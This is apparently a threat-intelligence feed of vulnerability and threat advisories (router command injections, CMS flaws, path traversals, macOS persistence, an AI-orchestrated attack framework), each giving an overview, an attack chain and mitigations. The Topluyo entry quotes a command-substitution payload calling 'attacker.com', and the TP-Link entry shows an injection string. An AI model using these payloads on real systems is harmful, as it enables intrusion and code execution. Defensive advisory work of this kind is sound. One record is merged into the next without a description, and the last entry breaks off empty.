objects.name: XunRuiCMS: Remote code injection via Mobile Site Directory (CVE-2026-120349)
objects.description: A security flaw has been discovered in dayrui XunRuiCMS up to 4.7.4. The function `str_replace` in the file `/var/www/html/zzmob/index.php` of the Mobile Site Directory component is affected. Manipulation of the `dirname` argument results in code injection. The attack can be launched remotely, and public exploit code is available. The vendor was contacted early about this disclosure but did not respond.

objects.name: Whitearmor Ransomware: Data Breach of AmplifAI GoDaddy Instance
objects.description:
## Overview
The Whitearmor ransomware group has claimed a successful breach of an AmplifAI instance used by GoDaddy. The actors exfiltrated a significant volume of data, including a database of 13,565 employees, operational rosters, and login logs detailing device usage and access locations. The leak confirms that the compromised instance is integrated with the GoDaddy Okta tenant, providing specific application IDs and federation metadata for Okta and Office 365. This presents a high risk of credential stuffing or session hijacking against the affected identity providers.

## Impact
The exfiltrated dataset contains sensitive employee information (names, emails, employee IDs, and password hashes/states) for over 13,500 individuals. Additionally, the exposure of Okta SSO and O365 federation parameters creates a direct risk for identity-based attacks targeting GoDaddy corporate systems.

## Recommendation
- Review Okta and Office 365 logs for anomalous access originating from accounts identified in the leaked database.
- Revoke and rotate credentials for any accounts found with non-default passwords in the leaked 'all_users.json' file.
- Monitor for unauthorized OIDC/SAML application access attempts utilizing the exfiltrated Application IDs (e.g., exksdlj2ty3Pfq9En0x7).
- Implement or enforce phishing-resistant Multi-Factor Authentication (MFA) for the identified GoDaddy Okta tenant.

objects.name: WAVLINK WN553X1-B: OS command injection (CVE-2026-120231)
objects.description: A vulnerability (CVE-2026-120231) has been identified in WAVLINK WN553X1-B firmware version V260403_2.0.0. The flaw is located in the function 'sub_416568' of the file '/bin/ioos' within the OpenVPN CLI Handler component. Manipulation of the 'file_id' argument results in OS command injection. The attack can be initiated remotely. Publicly disclosed exploit code exists and may be utilized. The vendor was contacted early regarding this disclosure.

objects.name: Nickboss WordPress File Upload: Stored Cross-Site Scripting (CVE-2026-66570)
objects.description: The WordPress File Upload plugin (wp-file-upload) by Nickboss is affected by a Stored Cross-Site Scripting (XSS) vulnerability, tracked as CVE-2026-66570. This issue is caused by the improper neutralization of input during web page generation and affects the plugin from version n/a through 5.2.1.

objects.name: D-Link DIR-505: Stack-based buffer overflow in TFTP Upload Filename Handler (CVE-2026-120189)
objects.description: A vulnerability was identified in D-Link DIR-505 1.10B02. The affected functions are `save_upload_file`/`mp_upload_file` located in `/usr/bin/tftpd`, part of the TFTP Upload Filename Handler component. This manipulation leads to a stack-based buffer overflow. The attack can be carried out remotely. Publicly available exploit code exists.

objects.name: WAVLINK WN536AX6-A: Remote command injection (CVE-2026-120276)
objects.description: A weakness has been identified in the Web Management Interface of the WAVLINK WN536AX6-A (version V260507_2.0.0). The vulnerability resides in function 'sub_416760' of the file '/bin/ioos'. Manipulation of the 'group_name' argument allows for remote OS command injection. Public exploit code is available for this vulnerability. The vendor was contacted early regarding this disclosure.

objects.name: SUSE Linux Kernel Multiple Vulnerabilities
objects.description:
## Overview

The French National Cybersecurity Agency (ANSSI) has published an advisory regarding multiple vulnerabilities identified in the SUSE Linux kernel. These security flaws impact a wide range of SUSE products and modules, including SUSE Linux Enterprise Server (SLES), openSUSE Leap, and SUSE Linux Micro. Confirmed impacts include potential data confidentiality breaches, security policy bypasses, and denial-of-service conditions. SUSE has released a series of security bulletins (SUSE-SU-2026:XXXX) to address these issues.

## Impact

Successful exploitation of these kernel vulnerabilities may lead to:
- Unauthorized access to sensitive data (confidentiality breach).
- Circumvention of established system security policies.
- System instability or crash (denial-of-service).

## Recommendation

1. Inventory all assets running SUSE Linux distributions, specifically checking for the versions listed in the affected products section.
2. Review the specific security bulletins referenced in the source documentation to identify required patch levels.
3. Prioritize patching internet-facing systems and high-availability clusters to prevent potential remote exploitation.
4. Coordinate with IT operations to perform testing and deployment of the SUSE kernel updates provided in the bulletins.

objects.name: Thelia: Stored cross-site scripting vulnerability (CVE-2026-120205)
objects.description: Thelia before 3.1.0 contains a stored cross-site scripting (XSS) vulnerability in the ForSomeCustomers::getSummary() method. Unauthenticated attackers can register with a script payload as their name. This script executes when administrators view related coupons, allowing the theft of CSRF tokens to create administrator accounts.

objects.name: Fortinet FortiOS and related products: Format string vulnerability in FGFM service (CVE-2024-23113)
objects.description:
## Overview

CVE-2024-23113 is a critical format string vulnerability affecting the FortiGate FGFM (FortiGate to FortiManager) protocol service. The service, which facilitates management communication, listens on TCP port 541. Improper handling of input strings allows an unauthenticated attacker to inject format specifiers, such as %n, which may result in remote code execution (RCE) or denial-of-service due to memory corruption. Public exploit code is available that targets this service by sending malformed payloads and monitoring for service-level SSL alerts or connection resets indicative of an exploit attempt.

## Impact

The vulnerability is rated at CVSS 9.8. Successful exploitation enables unauthenticated remote code execution with high impact on confidentiality, integrity, and availability. Exposure is increased due to the availability of functional proof-of-concept exploit scripts.

## Recommendation

1. Inventory all internet-facing FortiGate, Fortiproxy, Fortiswitchmanager, and Fortipam assets.
2. Restrict access to TCP port 541 (FGFM) to trusted management IP addresses only.
3. Apply vendor-provided security patches immediately to address the vulnerability in the affected versions of FortiOS, Fortiproxy, Fortiswitchmanager, and Fortipam.
4. Implement network-level monitoring to detect anomalous traffic patterns targeting port 541, specifically patterns containing common format string specifiers.

objects.name: MongoDB Server: Memory disclosure via zlib decompression (CVE-2025-14847)
Bolt CMS: Authenticated Remote Code Execution via File Manager (CVE-2022-36532)
objects.description: A proof-of-concept exploit is available for CVE-2022-36532, which affects Bolt CMS versions 5.1.12 and earlier. The vulnerability allows an authenticated user with access to the file manager to achieve remote code execution. The attack involves uploading a malicious file through the asynchronous upload endpoint - where file extension restrictions are not properly enforced - and subsequently using parameter confusion during a rename operation to convert the file into an executable PHP script.

objects.name: Topluyo Desktop for Linux OS Command Injection (CVE-2026-115904)
objects.description:
## Overview
Topluyo Desktop for Linux contains an OS Command Injection vulnerability (CVE-2026-115904) in the `openExternalLinks()` function within `utils.js`. The application improperly neutralizes user-supplied URLs before passing them to the `child_process.exec()` function, which executes commands via `/bin/sh -c`. Attackers can trigger arbitrary code execution by crafting a malicious URL containing shell meta-characters. The vulnerability was patched in version 2026.9.2410.

## Attack Chain
1. Attacker crafts a URL string containing command substitution syntax, such as `$(curl -s attacker.com/id)`.
2. Attacker hosts or delivers the malicious link to a target user via the application interface (e.g., chat, notification, or link preview).
3. The target user interacts with the link (clicks).
4. The `openExternalLinks()` function receives the URL.
5. The application invokes `child_process.exec("xdg-open [malicious_url]")`.
6. The system shell interprets the command substitution inside the URL parameter before executing `xdg-open`.
7. Arbitrary commands execute in the context of the user running the Topluyo Desktop application.

## Impact
Successful exploitation leads to full remote code execution in the context of the current desktop user. Impact includes arbitrary file access, credential theft, persistence installation (e.g., modifying `~/.bashrc` or `autostart`), and the establishment of reverse shells.

## Recommendation
- Upgrade Topluyo Desktop for Linux to version 2026.9.2410 or later immediately.
- For developers, replace `child_process.exec()` with `child_process.execFile()` when handling external system commands to prevent shell interpretation of arguments.
- Implement strict allow-listing for URL schemes (e.g., limit to `http:` and `https:`) before passing values to system calls.

objects.name: imgproxy: Out-of-bounds heap write in ICO loader
objects.description:
## Overview

imgproxy versions 3.3.0 through 4.0.15 contain an out-of-bounds heap write vulnerability in the ICO loader (`vips/icoload.c`). When processing an ICO file with a small declared image data size, the loader performs OOB reads and writes while reconstructing the BMP header. This causes memory corruption in the heap, specifically overwriting the size field of adjacent heap chunks. This corruption leads to a glibc `munmap_chunk()` error, causing the Go worker to abort (SIGABRT) and exit (exit code 2).

## Attack Chain

1. Attacker crafts a malicious ICO file containing a small `data_size` and specific header parameters.
2. Attacker sends an HTTP request to an exposed imgproxy endpoint to process the malicious ICO.
3. imgproxy passes the request to the underlying `vips` library.
4. The `vips_foreign_load_ico_header` function allocates a small heap buffer based on the malicious `data_size`.
5. The loader performs OOB reads from the malformed header and performs OOB writes during BMP reconstruction.
6. The size field of the following heap chunk is corrupted during the OOB write.
7. The application invokes `free()` on the corrupted chunk.
8. The glibc allocator detects the corruption and triggers `munmap_chunk(): invalid pointer`, leading to worker termination.

## Impact

Successful exploitation results in a persistent denial of service (DoS) for the specific worker process. Since a single request can trigger the abort, an attacker can crash workers at a rate proportional to the volume of requests sent to the vulnerable endpoint.

## Recommendation

1. Upgrade to imgproxy version 4.0.17 or later to incorporate the patch for the ICO loader heap memory corruption.
2. Implement request size limits and file validation filters to block unknown or suspicious ICO files before they reach the processing layer.
3. Deploy monitoring for worker process exit codes; alert on high frequencies of exit code 2 in imgproxy worker pods.

objects.name: Wavlink WN701AE: Remote OS Command Injection in ioos Web Backend (CVE-2026-120230)
objects.description: A vulnerability exists in the ioos Web Backend of Wavlink WN701AE 260105. The `del_vlan_group` function is susceptible to OS command injection through the `vlan_name` argument. This attack can be performed remotely, and public exploit code is available. The vendor was notified of this disclosure.

objects.name: Tychesoftwares Order Delivery Date Pro for WooCommerce: Privilege Escalation (CVE-2025-2907)
objects.description:
## Overview

Tychesoftwares Order Delivery Date Pro for WooCommerce versions prior to 12.3.1 are vulnerable to a missing authorization flaw (CVE-2025-2907). The vulnerability exists in the 'orddd-import-file' action, which fails to perform proper capability checks. An unauthenticated attacker can exploit this to update arbitrary WordPress site options. By modifying the site's default user registration role to 'administrator' and enabling user registrations, an attacker can create an administrative account, resulting in full site compromise.

## Impact

Successful exploitation allows unauthenticated attackers to gain administrative privileges on affected WordPress sites by modifying site options to enable arbitrary user registration and elevated account roles.

## Recommendation

* Update Tychesoftwares Order Delivery Date Pro for WooCommerce to version 12.3.1 or later immediately.
* Audit WordPress site options for unauthorized changes to registration settings, specifically 'users_can_register' and 'default_role'.
* Monitor server access logs for anomalous POST requests targeting the 'orddd-import-file' action.

objects.name: Apache HugeGraph-Server: Remote Code Execution via Gremlin Query Injection (CVE-2024-27348)
objects.description:
## Overview
CVE-2024-27348 is a critical Remote Code Execution vulnerability in Apache HugeGraph-Server. An attacker can submit a malicious Gremlin query to the `/gremlin` endpoint, leveraging Java reflection to achieve arbitrary code execution on the underlying host. Proof-of-concept toolkits are publicly available that demonstrate deploying a PHP web shell to `/tmp/shell.php` and initiating a PHP development server on port 4444 to provide persistent command-line access.

## Attack Chain
1. Reconnaissance: Identify target Apache HugeGraph-Server instance (typically port 8182).
2. Initial Access: Send a crafted Gremlin query containing malicious Java reflection payloads to the `/gremlin` endpoint.
3. Execution: Leverage Java reflection to execute system commands on the server.
4. Persistence/Payload Deployment: Write a PHP web shell to the local filesystem (e.g., `/tmp/shell.php`).
5. Payload Activation: Start a PHP development server on an arbitrary port (e.g., 4444) to host the web shell.
6. Command and Control: Connect via a remote bind shell client to the hosted web shell for interactive command execution.

## Recommendation
- Upgrade Apache HugeGraph-Server to version 3.7.2 or later immediately.
- Inspect the `/tmp` directory and web-accessible application directories for unauthorized PHP files or unexpected script execution.
- Monitor network traffic for unexpected connections originating from the HugeGraph server, specifically looking for outbound connections to port 4444 or abnormal traffic patterns on the Gremlin API port.
- Audit logs for the `/gremlin` endpoint to identify suspicious or highly anomalous query strings.

objects.name: Network-AI: AgentVCR path traversal vulnerability (CVE-2026-120312)
objects.description: Network-AI from 5.13.4 before 5.15.5 contains a path traversal vulnerability in AgentVCR. Attackers can pass traversal sequences to load() or save() to disclose sensitive JSON data or overwrite policy files such as AuthGuardian trust-level configuration.

objects.name: PhpSpreadsheet: XmlScanner TOCTOU bypass leading to XXE and DoS (CVE-2026-108357)
objects.description:
## Overview

PhpSpreadsheet contains a Time-of-Check Time-of-Use (TOCTOU) vulnerability (CVE-2026-108357) in its `XmlScanner::scan()` method. The scanner performs two sequential passes over input data, but the `unentity()` callback - which decodes HTML entities - executes *after* the security pattern check in both passes. By using double-encoded numeric entities (e.g., `&#60;`), an attacker can hide `<!DOCTYPE` declarations from the security filter. The first pass decodes the entity into a single-encoded format, and the second pass completes the decoding, resulting in a malicious `<!DOCTYPE` payload that the XML parser then executes.

## Attack Chain

1. Attacker crafts a malicious SpreadsheetML XML file containing double-encoded entities (e.g., `&#60;` for `<`).
2. The `Reader\Xml` component passes the raw file content to `XmlScanner::scan()`.
3. `XmlScanner::scan()` performs a pattern match on the raw input; the malicious `<!DOCTYPE` remains hidden.
4. The `unentity()` callback executes `html_entity_decode()`, converting the double-encoded entity to a single-encoded entity.
5. The partially decoded XML is stored in `Xml::$fileContents`.
6. The `Xml` reader initiates a second scan pass, which also fails to match the pattern because the entity is only partially decoded.
7. The `unentity()` callback executes again, converting the single-encoded entity into the raw `<` character.
8. `simplexml_load_string()` processes the final, now-malicious XML, triggering entity expansion (DoS) or XXE.

## Impact

- **Denial of Service:** Exploitation causes quadratic memory blowup via entity expansion.
- **Information Disclosure:** XXE/SSRF allows unauthorized reading of local files or internal network resources, specifically on PHP versions < 8.0 or when `LIBXML_NOENT` is enabled.

## Recommendation

- Upgrade PhpSpreadsheet to a patched version once available from PHPOffice.
- Audit applications that use `PhpOffice\PhpSpreadsheet\Reader\Xml` to identify intake points for user-supplied SpreadsheetML files.
- Implement file-type validation and strictly forbid `LIBXML_NOENT` if using older PHP environments.

objects.name: Termix-SSH Termix: Path traversal in transferToHost (CVE-2026-120322)
objects.description:
## Overview

CVE-2026-120322 identifies a critical path traversal vulnerability in Termix-SSH Termix versions 2.9.2 and earlier. The flaw exists within the `/plugin-api/file-manager/transferToHost` endpoint, specifically in the processing of the `destPath` argument. Successful exploitation allows a remote attacker to manipulate file system operations. The vulnerability has been addressed by forcing file transfers to use SFTP in File Manager plugin v1.0.0 and core version v26.10.0.

## Impact

The vulnerability allows remote attackers to perform unauthorized file system operations. Publicly available exploit code exists, increasing the risk of active exploitation.

## Recommendation

* Immediately upgrade Termix-SSH Termix core to version v26.10.0 or higher.
* Upgrade the File Manager plugin to v1.0.0 or higher.
* If upgrading is not immediately possible, restrict network access to the `/plugin-api/file-manager/transferToHost` endpoint.

objects.name: LobeChat: Path traversal arbitrary file write (CVE-2026-120315)
objects.description:
## Overview

LobeChat versions 1.84.26 up to 2.1.49 contain a path traversal vulnerability in the `writeTempFile()` function. An authenticated attacker can supply a malicious filename to the `file.createFile` method to write files outside of the intended directory. By triggering document parsing features, the attacker can overwrite sensitive application files, such as `startServer.js`, to achieve remote code execution or cause denial of service. 

## Impact

Authenticated users can achieve remote code execution (RCE) by overwriting application startup files or render the application unusable through arbitrary file overwriting (Denial of Service).

## Recommendation

Update LobeChat instances to version 2.1.49 or later immediately to patch the path traversal vulnerability in the `writeTempFile` function. Perform an audit of temporary file directories and application source code integrity to ensure no malicious files have been planted or existing files modified by unauthorized users prior to patching.

objects.name: WAVLINK WN579X3-D: Remote OS command injection (CVE-2026-120196)
objects.description: A vulnerability was detected in WAVLINK WN579X3-D V250402. The vulnerability affects the `port_forward` function within the file `/cgi-bin/wapi.cgi`. Manipulation of the `Name` argument results in OS command injection. The attack can be performed from a remote location, and the exploit is currently public. The vendor was contacted early regarding this disclosure.

objects.name: mathurvishal CloudClassroom-PHP-Project: Execution After Redirect (CVE-2026-120341)
objects.description:
## Overview
A security vulnerability exists in the studentdetails.php file of the CloudClassroom-PHP-Project application. The flaw enables remote execution after redirect. Public exploit code is available for this vulnerability. As the project follows a rolling release model, no specific affected or fixed version information is currently available. The vendor has not responded to disclosure attempts.

## Impact
The vulnerability allows for remote exploitation, potentially leading to unauthorized execution within the web application context.

## Recommendation
- Identify all instances of the CloudClassroom-PHP-Project within the enterprise environment.
- Implement access control restrictions to limit public access to the studentdetails.php endpoint.
- Monitor web server access logs for anomalous requests to studentdetails.php that precede redirected responses or suspicious subsequent requests.
- Evaluate the necessity of the application given the lack of vendor response and absence of formal patch management in a rolling release model.

objects.name: Beta9 Worker: Sandbox path traversal (CVE-2026-120307)
objects.description:
## Overview

Beta9 worker versions prior to 0.1.756 are vulnerable to a path traversal flaw in the sandbox file API due to improper sanitization in the getHostPathFromContainerPath function. Attackers with a valid workspace token and an active sandbox can perform unauthorized file operations on the host worker filesystem. This access can be used to read or modify data belonging to other tenants and, in cases where the worker pod is assigned cluster-admin permissions, can lead to full cluster compromise. The vulnerability is confirmed to allow reading the Kubernetes service account token.

## Attack Chain

1. Attacker gains access to a valid tenant workspace token.
2. Attacker initiates or uses an active sandbox session.
3. Attacker crafts a file path containing sequences that bypass the mount destination prefix check.
4. The getHostPathFromContainerPath function resolves the malicious path to an absolute path on the host worker filesystem.
5. The file API calls (Upload, download, stat, list, find-in-files, replace-in-files, or delete-file) interact with the resolved host path.
6. The attacker reads or modifies sensitive host files, such as the Kubernetes service account token.
7. If applicable, the attacker uses the stolen service account token to achieve cluster-admin access.

## Impact

An attacker can achieve full read, write, and delete access to the host worker filesystem as root. This allows for the exfiltration of data from other tenants on the same worker and potential cluster-wide privilege escalation if the worker pod is configured with elevated Kubernetes permissions.

## Recommendation

- Upgrade the Beta9 worker to version 0.1.756 or later immediately to implement os.OpenRoot for sandbox file operations.
- Audit Kubernetes RBAC configurations for worker pods to ensure the principle of least privilege is applied, specifically restricting cluster-admin access for worker pods.
- Review access logs for the sandbox file API for anomalous path requests involving multiple parent-directory segments.

objects.name: BookIt: SQL injection vulnerability (CVE-2026-62048)
objects.description: The BookIt plugin (by Liquid Web / StellarWP) contains an Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability. This issue affects BookIt from versions n/a through 2.6.0.6. The CVSS v3.1 base score for this vulnerability is 9.3.

objects.name: C-Kermit: Multiple vulnerabilities including RCE
objects.description:
## Overview

A code quality sweep of C-Kermit has identified three distinct security vulnerabilities. The most critical issue allows for remote code execution when a user interacts with a malicious peer. Additional vulnerabilities include an authentication bypass and TLS certificate spoofing. These issues are currently documented under GitHub Security Advisories; CVE identifiers are pending allocation. Users are advised to monitor the upstream repository for patch releases.

## Impact

Successful exploitation of the RCE vulnerability could allow an attacker to achieve remote code execution on the system running C-Kermit by simulating a malicious peer connection. The authentication bypass and TLS spoofing flaws compromise the integrity and confidentiality of communication sessions.

## Recommendation

* Monitor the C-Kermit GitHub repository and security advisories for the release of patched versions.
* Audit systems running C-Kermit to identify and restrict exposure to untrusted or public peer connections.
* Until patches are available, avoid connecting C-Kermit to untrusted remote peers, as these interactions facilitate the observed RCE and authentication bypass vectors.

objects.name: Aklivity Zilla: Path traversal vulnerability (CVE-2026-120324)
objects.description: A weakness has been identified in Aklivity Zilla (up to 1.3.4/2.4.7/2.5.0-rc2) within the Path.resolve function of the FileSystemServerFactory file in the http-filesystem Binding component. Manipulation of the params argument causes path traversal. Remote exploitation is possible, and a public exploit is available. Upgrading to version 2.5.0-rc3 (patch 46a8b15cbea157f7ae8b7cb865809a02fd6b1988) addresses the issue.

objects.name: Apache HTTP Server: TLS 1.3 Session Resumption Authentication Bypass (CVE-2025-23048)
objects.description:
## Overview
Apache HTTP Server versions 2.4.35 through 2.4.62 are vulnerable to a client certificate authentication bypass (CVE-2025-23048) when TLS 1.3 session resumption is enabled. The vulnerability occurs because the server may incorrectly reuse a session established on one virtual host (vhost1) for a different virtual host (vhost2) that requires a distinct client CA certificate. This allows an attacker possessing a valid certificate for vhost1 to access protected resources on vhost2 without providing a certificate trusted by vhost2.

## Attack Chain
1. Attacker identifies two virtual hosts on a target Apache server configured with differing `SSLCACertificateFile` directives.
2. Attacker performs a full TLS 1.3 handshake with the first virtual host using a valid client certificate trusted by that specific host.
3. The Apache server accepts the handshake and issues a session ticket.
4. Attacker captures the session ticket or maintains the session state.
5. Attacker initiates a connection to the second virtual host (vhost2) requesting a restricted path.
6. Attacker uses the session ticket from vhost1 to resume the TLS session on vhost2.
7. Apache incorrectly validates the resumed session, bypassing the client certificate check required for vhost2.
8. Attacker gains unauthorized access to protected resources on vhost2.

## Recommendation
- Upgrade Apache HTTP Server to version 2.4.64 or later to address the vulnerability.
- If upgrading is not immediately possible, set `SSLStrictSNIVHostCheck on` within the virtual host configuration for all TLS 1.3 enabled hosts that rely on distinct client certificate authorities. This setting prevents cross-SNI session resumption and mitigates the bypass.

objects.name: macOS Persistence via Login Hook plist Modification
objects.description:
## Overview

The `com.apple.loginwindow` preferences domain supports the deprecated `LoginHook` and `LogoutHook` keys, which allow for the execution of arbitrary scripts or binaries with root privileges every time a user logs in or out. Adversaries leverage these keys by writing to the `com.apple.loginwindow.plist` file, typically located in `/var/root/Library/Preferences/`, `/Library/Preferences/`, or `~/Library/Preferences/`. This technique provides a mechanism for automatic execution during system boot or user login.

## Impact

Successful exploitation allows for persistent execution of arbitrary code with root privileges upon every login or logout event on the affected macOS host.

## Recommendation

- Deploy file integrity monitoring to alert on any modification to `com.apple.loginwindow.plist` files across the environment.
- Review all existing `LoginHook` and `LogoutHook` configurations on high-value macOS hosts using `sudo plutil -p /var/root/Library/Preferences/com.apple.loginwindow.plist`.
- Validate modifications against expected configuration management, backup, and system migration activity.
- Remove unauthorized hooks using `sudo defaults delete com.apple.loginwindow LoginHook`.

objects.name: Presenton: API authentication vulnerability (CVE-2026-120191)
objects.description: A weakness has been identified in Presenton versions up to 0.9.11-beta affecting unknown functionality of the component API. This issue results in missing authentication and can be initiated remotely. A public exploit is available. Upgrading to version 0.9.12-beta (patch 44c8a61122b21f17642d717b0c4d6f2c54c0f180) is recommended to resolve this issue.

objects.name: Beta9: Build worker isolation deficiency (CVE-2026-120306)
objects.description: Beta9 worker pods perform image builds using Buildah with insufficient isolation. Tenant-provided shell commands are executed as RUN instructions within the worker, which shares PID, network, IPC, and user namespaces with the build worker container. The worker runs as UID 0 with CAP_DAC_OVERRIDE. Access to /proc/1/root allows the build process to interact with the worker's filesystem, which contains runc, buildah, and runsc binaries, Kubernetes service account tokens, and mounted host directories.

objects.name: Citrix NetScaler: AAA Service pre-authentication heap overflow (CVE-2026-8452)
objects.description:
## Overview
CVE-2026-8452 is a memory corruption vulnerability in the Citrix NetScaler AAA service. The flaw is a heap overflow that allows for unauthenticated remote code execution. The vulnerability is specifically reachable when the NetScaler appliance is configured to use SAML as either a Service Provider (SP) or an Identity Provider (IdP). A working exploit has been publicly disclosed, including a tool that deploys a webshell to the appliance.

## Attack Chain
1. Attacker identifies an internet-facing Citrix NetScaler appliance configured with SAML.
2. Attacker sends a crafted request to the AAA service endpoint to trigger a heap overflow.
3. Memory corruption allows for controlled execution flow redirection.
4. Attacker leverages the heap overflow to execute arbitrary shellcode.
5. Shellcode writes a PHP webshell to a predictable location (e.g., /vpn/theme/x.php).
6. Attacker interacts with the webshell to execute arbitrary system commands with root privileges.

## Impact
Successful exploitation allows an unauthenticated attacker to execute arbitrary code with root privileges on the affected NetScaler appliance, potentially leading to full compromise of the device and persistent access.

## Recommendation
- Immediately patch all Citrix NetScaler ADC and Gateway instances to the versions identified by the vendor as non-vulnerable: NetScaler ADC/Gateway 13.1 (>= 13.1-63.18) and 14.1 (>= 14.1-72.61).
- Review network access controls to ensure the AAA service is not unnecessarily exposed to untrusted networks.
- Audit the web directory paths mentioned in the exploit (e.g., /vpn/theme/) for the presence of unauthorized files or scripts.

objects.name: macOS: Unauthorized screensaver configuration modification
objects.description:
## Overview

Adversaries can establish persistence on macOS by deploying a malicious screensaver (.saver) bundle and modifying the associated screensaver preference (plist) files. This forces the system to execute the malicious bundle whenever the screensaver activates. Detection focuses on identifying modifications to `com.apple.screensaver.*.plist` files performed by unsigned, untrusted, or common script-based processes.

## Attack Chain

1. Attacker gains initial access to the macOS host.
2. Attacker writes a malicious screensaver (.saver) bundle to a directory such as `~/Library/Screen Savers/`.
3. Attacker uses an untrusted process or script interpreter (e.g., `python`, `osascript`, `perl`) to modify the screensaver preference plist.
4. The system, upon user inactivity or manual activation, triggers the `ScreenSaverEngine`.
5. The screensaver engine loads the malicious .saver bundle.
6. The malicious bundle executes arbitrary code under the context of the active user session.

## Recommendation

- Deploy the provided detection logic to identify unauthorized modifications to screensaver preferences.
- Investigate any process modifying `com.apple.screensaver.*.plist` files that lacks a valid code signature or is a known script interpreter.
- Review the contents of `~/Library/Screen Savers/` and `/Library/Screen Savers/` for unexpected or unsigned .saver bundles.
- Verify that legitimate device management solutions or administrative scripts interacting with plist files are properly signed and identified as authorized.

objects.name: CyberStrikeAI: AI-orchestrated post-exploitation attacks
objects.description:
## Overview
The CyberStrikeAI framework is an open-source, Go-based penetration testing platform that integrates an LLM-driven orchestrator with a C2 server. Unlike traditional manual penetration testing tools, the LLM-orchestrator automatically determines the sequence of commands and technical steps required to fulfill high-level operator tasks. Victims identified include educational institutions in Africa and Latin America. The post-exploitation phase is highly automated, progressing from initial access via compromised SQL Server instances to full domain compromise with minimal human intervention.

## Attack Chain
1. Initial access via compromised SQL Server (version 16.0.1000).
2. Deployment of CyberStrikeAI C2 implant via webshell or existing access.
3. Establishment of persistence and local host reconnaissance (completed within 2 minutes).
4. Conduct of broad domain reconnaissance over approximately 5 hours.
5. Pause in activity for several days.
6. Final offensive stage including lateral movement via SMB and WMI, mass credential dumping, and database exfiltration (completed within 1 hour).

## Impact
Confirmed impact includes full domain compromise of educational institutions. The integration of LLMs into core attack operations enables rapid execution of technical tasks that traditionally required significant manual effort, drastically reducing the time required for lateral movement and data exfiltration.

## Recommendation
- Hunt for the presence of the 'X-Implant-Token' custom HTTP header in network traffic, as this is a consistent indicator of CyberStrikeAI C2 communication.
- Audit SQL Server environments (version 16.0.1000 and others) for unauthorized process execution, specifically looking for 'sqlservr.exe' spawning suspicious child processes (e.g., cmd.exe, powershell.exe).
- Monitor for unexpected WMI and SMB traffic patterns originating from database servers, which may indicate lateral movement.
- Implement memory scanning for Go-based implants that exhibit the specific build metadata patterns described by the framework.

objects.name: TP-Link Archer AX17: Authenticated OS command injection (CVE-2026-9151)
objects.description:
## Overview
CVE-2026-9151 is an authenticated OS command injection vulnerability in the Archer AX17 v1 VPN client import functionality. The issue arises because the profile description field is insufficiently sanitized and later processed by system commands (`grep` and `sed`) running with root privileges. An authenticated administrative session from the LAN is required to exploit this.

## Attack Chain
1. Attacker establishes an authenticated administrative session on the LAN.
2. Attacker triggers the VPN client import functionality on the router.
3. Attacker submits a crafted OpenVPN profile description containing a payload using backticks and `${IFS}` to bypass input filtering (e.g., `` `sleep${IFS}1` ``).
4. The router stores the malicious string as a filename in `/etc/openvpn/.ovpn`.
5. The application writes the path to `/tmp/ovpn_curr_edit`.
6. The web server executes `grep` and `sed` commands using the unquoted path from `/tmp/ovpn_curr_edit`.
7. The system shell interprets the injected backticks as commands, executing the payload with root privileges.

## Impact
Successful exploitation allows for full command execution on the router as the root user, potentially leading to a complete compromise of the network device.

## Recommendation
- Update Archer AX17 v1 firmware to version 1.5.0 Build 20260605 or later.
- Limit administrative access to the router web interface to trusted management subnets or hardened endpoints to mitigate the risk of an attacker gaining the required administrative session.
- Audit logs for unexpected administrative logins or configuration changes on network devices.

objects.name: Wavlink WN551X3-A: Remote OS Command Injection (CVE-2026-120345)
objects.description:
## Overview
CVE-2026-120345 is a remote OS command injection vulnerability in the DNS Resolution Handler (function sub_41a430 in /bin/ioos) of the Wavlink WN551X3-A router (specifically firmware version M51X3_V251020-WO-182e965). The vulnerability can be triggered by sending a maliciously crafted 'data' argument to the DNS resolution function. As the vulnerability is unauthenticated and a proof-of-concept exploit is publicly available, the risk to exposed devices is high.

## Impact
Successful exploitation allows unauthenticated remote attackers to execute arbitrary OS commands with the privileges of the DNS resolution service on the affected router. This can lead to full device compromise, persistence, and potential pivot points into internal networks.

## Recommendation
- Immediately inventory and restrict internet access to Wavlink WN551X3-A routers.
- Implement network segmentation to isolate these devices from critical infrastructure.
- Monitor logs for unusual traffic targeting router administrative or DNS management interfaces.
- Contact the vendor regarding availability of firmware updates for the affected model and version.

objects.name: Dell OpenManage Enterprise: OS Command Injection (CVE-2026-94349)
objects.description: Dell OpenManage Enterprise versions prior to 4.8.0 contain an Improper Neutralization of Special Elements used in an OS Command vulnerability (CVE-2026-94349). A low-privileged attacker with adjacent network access could potentially exploit this to achieve command execution.

objects.name: Fastify: @fastify/reply-from path traversal (CVE-2026-117518)
objects.description:
## Overview

The @fastify/reply-from plugin (versions up to and including 12.8.0) fails to properly validate proxy paths containing backslash dot-segments. The WHATWG URL parser used by the plugin normalizes these backslashes to forward slashes, bypassing security guards intended to scope proxying to specific upstream prefixes. An attacker can exploit this to access restricted upstream API endpoints. The vulnerability is fixed in version 12.8.1.

## Impact

Successful exploitation allows unauthenticated users to escape intended proxy boundaries, resulting in unauthorized access to unintended upstream resources. This is primarily a confidentiality impact with limited integrity impact.

## Recommendation

Update the @fastify/reply-from package to version 12.8.1 or later. There are no available workarounds.

objects.name: Google::Auth for Perl: SSRF and OAuth state validation vulnerabilities (CVE-2026-74759, CVE-2026-74760)
objects.description:
## Overview
Two vulnerabilities were disclosed in the Google::Auth Perl module. CVE-2026-74759 concerns an SSRF vulnerability occurring when the library processes unvalidated `credential_source` URLs while handling AWS external account credentials. CVE-2026-74760 involves an authentication bypass in the `gcloud-auth` login callback, which fails to verify OAuth state parameters, allowing an attacker to inject an authorization code from an unauthorized local process.

## Impact
CVE-2026-74759 may allow an attacker to force the application to make unauthorized requests to internal network resources. CVE-2026-74760 may lead to account takeover or unauthorized access to Google Cloud resources if an attacker successfully intercepts or injects a local authorization callback.

## Recommendation
* Update Google::Auth for Perl to a patched version that resolves these vulnerabilities.
* Audit applications using Google::Auth to identify usage of AWS external account credentials or local `gcloud-auth` login workflows.
* Restrict local network access for applications performing OAuth flows to prevent unauthorized local process interference.

objects.name: Adoption of Autonomous Agentic Frameworks for Offensive Operations
objects.description:
## Overview

